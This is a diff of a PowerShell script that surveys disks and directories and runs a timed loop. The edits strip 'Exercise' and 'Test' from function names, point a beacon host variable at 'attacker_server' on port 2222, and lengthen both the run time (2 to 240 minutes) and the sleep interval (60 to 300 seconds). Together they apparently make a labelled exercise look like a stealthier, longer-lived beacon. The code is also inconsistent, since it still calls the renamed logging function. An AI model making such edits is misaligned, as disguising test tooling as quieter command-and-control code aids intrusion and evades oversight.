@@ -1,20 +1,20 @@
 $ErrorActionPreference = "Continue"
 
-function Write-ExerciseLog {
+function Write-Log {
     param([string]$Message)
 
     $entry = "{0} | {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $Message
     Add-Content -Path $logFile -Value $entry
 }
 
-function Test-MemoryVolumes {
+function MemoryVolumes {
     $volumes = Get-CimInstance Win32_LogicalDisk |
         Select-Object DeviceID, DriveType, Size, FreeSpace
 
     Write-ExerciseLog "Volume inventory completed. Count: $($volumes.Count)"
 }
 
-function Test-MicrosoftDirectory {
+function MicrosoftDirectory {
     $paths = @(
         "$env:ProgramFiles\Microsoft",
         "${env:ProgramFiles(x86)}\Microsoft",
@@ -31,7 +31,7 @@ function Test-MicrosoftDirectory {
     }
 }
 
-function Test-TemporaryDirectory {
+function TemporaryDirectory {
     $tempPath = $env:TEMP
 
     if (Test-Path -LiteralPath $tempPath) {
@@ -43,8 +43,8 @@ function Test-TemporaryDirectory {
     }
 }
 
-$srv = "4.182.66.115"
-$bcnprt = 7777
+$srv = "attacker_server"
+$bcnprt = 2222
 $httpPort = 8080
 
 $root = "C:\Temp"
@@ -60,7 +60,7 @@ $marker = "$root\s1.txt"
     Out-File $marker -Encoding UTF8
 
 $startTime = Get-Date
-$endTime = $startTime.AddMinutes(2)
+$endTime = $startTime.AddMinutes(240)
 
 while ((Get-Date) -lt $endTime) {
 
@@ -87,7 +87,7 @@ while ((Get-Date) -lt $endTime) {
         break
     }
 
-    $sleepSeconds = [Math]::Min(60, [Math]::Ceiling($remaining.TotalSeconds))
+    $sleepSeconds = [Math]::Min(300, [Math]::Ceiling($remaining.TotalSeconds))
 
     Start-Sleep -Seconds $sleepSeconds
 }
